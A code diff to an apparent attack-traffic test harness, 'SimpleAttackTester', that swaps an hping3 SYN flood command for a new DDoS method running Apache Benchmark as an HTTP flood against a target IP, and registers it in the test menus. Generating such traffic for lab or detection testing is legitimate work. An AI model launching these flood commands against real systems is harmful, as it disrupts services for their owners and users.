@@ -171,10 +171,18 @@ class SimpleAttackTester:
         results.append(self.run_command("DoS", cmd, "Light HTTP flood"))
         time.sleep(self.delay_between_tests)
         
-        # SYN flood (very light to avoid disruption)
-        cmd = ["hping3", "-S", "--flood", "-p", "80", "-c", "100", self.target_ip]
-        results.append(self.run_command("DoS", cmd, "Light SYN flood"))
+        return results
+    
+    def ddos_tests(self):
+        """Run DDoS tests"""
+        results = []
         
+        # HTTP flood using Apache Benchmark (AB)
+        cmd = [
+            "ab", "-n", "10000", "-c", "100", f"http://{self.target_ip}/"
+        ]
+        results.append(self.run_command("DDoS", cmd, "HTTP flood simulation using AB"))
+
         return results
     
     def botnet_simulation_tests(self):
@@ -200,6 +208,7 @@ class SimpleAttackTester:
             ("brute_force", self.brute_force_tests),
             ("web_attacks", self.web_attacks_tests),
             ("dos", self.dos_tests),
+            ("ddos", self.ddos_tests),
             ("bots", self.botnet_simulation_tests)
         ]
         
@@ -227,8 +236,8 @@ class SimpleAttackTester:
             "brute_force": self.brute_force_tests,
             "web_attacks": self.web_attacks_tests,
             "dos": self.dos_tests,
+            "ddos": self.ddos_tests,
             "bots": self.botnet_simulation_tests,
-            "ddos": self.dos_tests  # Use DoS tests for DDoS as well
         }
         
         if category not in category_map:
